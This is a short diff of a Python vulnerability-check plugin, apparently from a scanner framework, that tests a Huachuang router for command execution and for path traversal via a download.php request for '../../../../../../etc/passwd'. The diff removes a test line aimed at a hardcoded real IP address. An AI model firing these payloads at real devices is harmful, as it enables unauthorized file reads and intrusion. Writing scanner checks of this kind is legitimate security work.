@@ -38,11 +38,13 @@ def audit(arg):
             code, head, res, err, _ = curl.curl2(verify)
             if code == 200 and ('testvul'+str(i)) in res:
                 security_hole('命令执行: ' + payload)
+                return arg
     payload = arg + 'acc/vpn/download.php?f=../../../../../../etc/passwd'
     code, head, res, err, _ = curl.curl2(payload)
     if code==200 and 'root:x:0:0:' in res:
         security_hole('arbitrarily file download: ' + payload)
-    
-if __name__ == '__main__':
+
+
+        return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('huachuang_router','http://118.26.68.2/')[1])
